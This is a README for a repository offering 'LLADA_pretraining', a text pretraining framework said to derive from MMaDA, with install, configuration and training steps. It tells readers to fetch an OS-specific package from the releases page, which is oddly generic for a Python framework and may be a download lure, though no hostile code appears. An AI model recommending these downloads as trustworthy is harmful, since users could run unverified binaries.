# 🚀 LLADA_pretraining - A Simplified Text Pretraining Framework

<div align="center">
  <a href="https://github.com/thomionline27/LLADA_pretraining/releases">
    <img 
        src="https://img.shields.io/badge/Download%20LLADA%20Pretraining-blue.svg" 
        alt="Download LLADA Pretraining"
        style="height: 50px; width: 200px;"
    />
  </a>
</div>

## 🌟 Introduction
Welcome to LLaDA Pretraining, a framework designed for text pretraining of LLaDA models. This software is derived from the MMaDA codebase. Although it is still being tested, it aims to make training models easier and more efficient.

### Features:
- Simple text-only training pipeline
- Support for distributed training using DeepSpeed and Accelerate
- Configuration is easy with a YAML format
- Efficient memory usage during training

## 🔧 System Requirements
Before you get started, ensure your system meets these requirements:
- Operating System: Windows, macOS, or Linux
- Python version: 3.7 or higher
- Memory: At least 8 GB RAM
- Disk Space: Minimum of 1 GB available

## 🚀 Getting Started

### Download & Install
1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/thomionline27/LLADA_pretraining/releases) to download the latest version.
   
2. **Download the Package**: Click on the appropriate link for your operating system. Save the file in a location you can easily access.

3. **Install Required Packages**:
   Open your command line interface (Terminal on macOS/Linux or Command Prompt on Windows) and navigate to the folder where you saved the file. Run the following command:

   ```bash
   pip install -r requirements.txt
   ```

### Basic Training
To begin training your model, follow these steps:

1. **Update Configuration**:
   - Open the file `configs/llada_pretraining.yaml` in a text editor.
   - Update the paths according to your file structure.

2. **Run the Training Script**:
   Execute the following command in your terminal:

   ```bash
   bash scripts/train.sh
   ```

This command will start the training process using the setups you specified.

## 📄 Configuration Options
You can customize your training by editing the YAML configuration file. Common settings include training algorithm type, learning rate, and batch size. For optimal results, adjust these values based on your dataset and system capabilities.

## 🛠️ Troubleshooting
- **Installation Issues**: If you face errors during the installation of dependencies, ensure your Python is updated. Use `pip install --upgrade pip` to get the latest version.
- **Running Scripts**: If the training script doesn’t start, check whether the file has execute permissions or try running the command with `bash` in front.

For additional help, check the [Issues Section](https://github.com/thomionline27/LLADA_pretraining/issues) of this repository.

## 📚 Learning Resources
- [Official Python Documentation](https://docs.python.org/3/)
- [YAML for Beginners](https://yaml.org/start.html)
- [DeepSpeed Documentation](https://www.deepspeed.ai/docs/)

## 👥 Community and Support
Join our community for support and discussions:
- Check the [Discussions Page](https://github.com/thomionline27/LLADA_pretraining/discussions) for announcements and user conversations.
- Feel free to open an issue if you encounter a problem or have questions.

## 🔗 Additional Links
- Visit our GitHub Repository: [LLADA Pretraining on GitHub](https://github.com/thomionline27/LLADA_pretraining)
- Refer to our parent project MMaDA: [MMaDA](https://github.com/Gen-Verse/MMaDA)

Thank you for utilizing LLADA Pretraining. We hope it serves your needs effectively.